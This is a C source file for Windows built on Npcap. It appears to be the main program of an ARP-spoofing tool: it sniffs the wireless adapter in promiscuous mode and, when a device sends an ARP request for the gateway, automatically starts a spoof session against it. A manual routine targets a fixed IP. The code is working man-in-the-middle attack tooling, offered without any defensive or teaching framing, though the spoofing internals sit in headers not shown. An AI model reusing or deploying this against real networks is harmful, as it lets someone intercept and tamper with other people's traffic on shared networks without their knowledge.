#include "pcap.h"
#include "ntddndis.h"
#include "iphlpapi.h"
#include "signal.h"
#include "tchar.h"
#include "packet.h"
#include "spoof.h"
#include "globals.h"
#include "channelling.h"

// System Specific
HANDLE hBackwardThread, hForwardThread;
BOOL LoadNpcapDlls()
{
    _TCHAR npcap_dir[512];
    UINT len;
    len = GetSystemDirectory(npcap_dir, 480);
    if (!len)
    {
        fprintf(stderr, "Error in GetSystemDirectory: %x", GetLastError());
        return FALSE;
    }
    _tcscat_s(npcap_dir, 512, _T("\\Npcap"));
    if (SetDllDirectory(npcap_dir) == 0)
    {
        fprintf(stderr, "Error in SetDllDirectory: %x", GetLastError());
        return FALSE;
    }
    return TRUE;
}

// Statics

static bool enableAutoSpoof = false;
static bool shouldExitProgram = false;

// Logics

void init_addrs();
void on_sig_int(int sig);
void manual_setup_spoof(uint32_t targetIp);
void enable_auto_spoof(BOOL value) { enableAutoSpoof = value; }
void discovery_packet_handler(u_char *argument, const struct pcap_pkthdr *packet_heaher, const unsigned char *packet_content);

pcap_t *mainDevice;

int main(int argc, char **argv)
{
    char errbuf[PCAP_BUF_SIZE];

    if (!LoadNpcapDlls())
    {
        printf("Failed to load Npcap!");
        exit(1);
    }

    init_addrs();

    // manual_setup_spoof(inet_addr("192.168.43.11"));

    mainDevice = pcap_open(WLAN_DEVICE_NAME, 65536, PCAP_OPENFLAG_PROMISCUOUS, 0, NULL, errbuf);
    if (mainDevice == NULL)
    {
        LOG("Failed:%s\n", errbuf)
        exit(1);
    }

    // pcap_dumper_t *dumpDevice = pcap_dump_open(mainDevice, "dump.pcap");

    LOG("Capture started");
    signal(SIGINT, on_sig_int);

    if (pcap_loop(mainDevice, -1, discovery_packet_handler, NULL))
    {
        LOG("Failed:%s\n", errbuf)
        exit(1);
    }
}

void init_addrs()
{
    FILE *wslIpFile = fopen("wslip.txt", "r");
    char ipStr[1024];
    memset(ipStr, 0, sizeof ipStr);
    while (strcmp("src", ipStr) != 0)
        fscanf(wslIpFile, "%s", ipStr);
    fscanf(wslIpFile, "%s", ipStr);
    ipWsl = inet_addr(ipStr);
    fclose(wslIpFile);

    PIP_ADAPTER_INFO pAdapterInfo;

    ULONG ulOutBufLen = sizeof(IP_ADAPTER_INFO);
    pAdapterInfo = (IP_ADAPTER_INFO *)malloc(sizeof(IP_ADAPTER_INFO));
    if (pAdapterInfo == NULL)
    {
        LOG("Error allocating memory needed to call GetAdaptersinfo\n");
        exit(1);
    }
    // Make an initial call to GetAdaptersInfo to get
    // the necessary size into the ulOutBufLen variable
    if (GetAdaptersInfo(pAdapterInfo, &ulOutBufLen) == ERROR_BUFFER_OVERFLOW)
    {
        free(pAdapterInfo);
        pAdapterInfo = (IP_ADAPTER_INFO *)malloc(ulOutBufLen);
        if (pAdapterInfo == NULL)
        {
            LOG("Error allocating memory needed to call GetAdaptersinfo\n");
            exit(1);
        }
    }

    DWORD dwRetVal;
    if ((dwRetVal = GetAdaptersInfo(pAdapterInfo, &ulOutBufLen)) == NO_ERROR)
    {
        PIP_ADAPTER_INFO pAdapter = pAdapterInfo;
        while (pAdapter)
        {
            if (strstr(WLAN_DEVICE_NAME, pAdapter->AdapterName) != NULL)
            {
                ipAddr = inet_addr(pAdapter->IpAddressList.IpAddress.String);
                gateAddr = inet_addr(pAdapter->GatewayList.IpAddress.String);
                for (int i = 0; i < pAdapter->AddressLength; i++)
                {
                    localMacAddr[i] = pAdapter->Address[i];
                }
                ULONG size = 6;
                SendARP(gateAddr, ipAddr, gateMacAddr, &size);

                if (size != 6)
                {
                    LOG("Failed to obtain Mac Addresses!")
                    exit(1);
                }
                LOG("Mac Addresses:\nLocal:%.2x%.2x%.2x%.2x%.2x%.2x\nGate:%.2x%.2x%.2x%.2x%.2x%.2x",
                    localMacAddr[0], localMacAddr[1], localMacAddr[2], localMacAddr[3], localMacAddr[4], localMacAddr[5],
                    gateMacAddr[0], gateMacAddr[1], gateMacAddr[2], gateMacAddr[3], gateMacAddr[4], gateMacAddr[5])
            }
            else if (strstr(VETHER_DEVICE_NAME, pAdapter->AdapterName) != NULL)
            {
                ipWslHost = inet_addr(pAdapter->IpAddressList.IpAddress.String);
                for (int i = 0; i < pAdapter->AddressLength; i++)
                {
                    wslHostAddr[i] = pAdapter->Address[i];
                }
                ULONG size = 6;
                SendARP(ipWsl, ipWslHost, wslAddr, &size);

                if (size != 6)
                {
                    LOG("Failed to obtain Mac Addresses!")
                    exit(1);
                }
                LOG("vEthernet Mac Addresses:\nLocal:%.2x%.2x%.2x%.2x%.2x%.2x\nWSL:%.2x%.2x%.2x%.2x%.2x%.2x",
                    wslHostAddr[0], wslHostAddr[1], wslHostAddr[2], wslHostAddr[3], wslHostAddr[4], wslHostAddr[5],
                    wslAddr[0], wslAddr[1], wslAddr[2], wslAddr[3], wslAddr[4], wslAddr[5])
            }
            pAdapter = pAdapter->Next;
        }
    }
    else
    {
        LOG("GetAdaptersInfo failed with error: %d\n", dwRetVal);
        exit(1);
    }

    if (pAdapterInfo)
        free(pAdapterInfo);
}

void discovery_packet_handler(u_char *argument, const struct pcap_pkthdr *packet_heaher, const unsigned char *packet_content)
{
    if (shouldExitProgram)
    {
        return;
    }
    const EthernetPacket *ethPacket = NULL;
    ethPacket = (EthernetPacket *)packet_content;
    if (!memcmp(ethPacket->header.ether_shost, localMacAddr, MACADDR_LEN)) // Packet sent by us
    {
        // ignore it
        return;
    }

    uint32_t arp = ntohs(0x0806);
    if (ethPacket->header.ether_type == arp) // arp
    {
        ArpPacket *arpPacket = (ArpPacket *)ethPacket;
        if (enableAutoSpoof && arpPacket->arp.ar_op == 1 && memcmp(&arpPacket->arp.ar_sha, localMacAddr, 6)) // request
        {
            if (arpPacket->arp.ar_tip == gateAddr)
            // We got an newbie, spoof it
            {
                CreateSpoofSession(arpPacket->arp.ar_sha, arpPacket->arp.ar_sip);
                return;
            }
        }
    }
}

void manual_setup_spoof(uint32_t targetIp)
{
    ULONG size = 6;
    char targetMac[6];
    SendARP(targetIp, ipAddr, targetMac, &size);

    if (size != 6)
    {
        struct in_addr addr;
        addr.s_addr = targetIp;
        LOG("Failed to obtain Mac Addresses for target ip %s", inet_ntoa(addr))
        return;
    }

    CreateSpoofSession(targetMac, targetIp);
}

void on_sig_int(int sig)
{
    shouldExitProgram = true;
    printf("Shutting down...");
    for (int i = 0; i < spoofSessionTop; i++)
        ShutdownSpoofSession(&spoofSessions[i]);

    exit(0);
}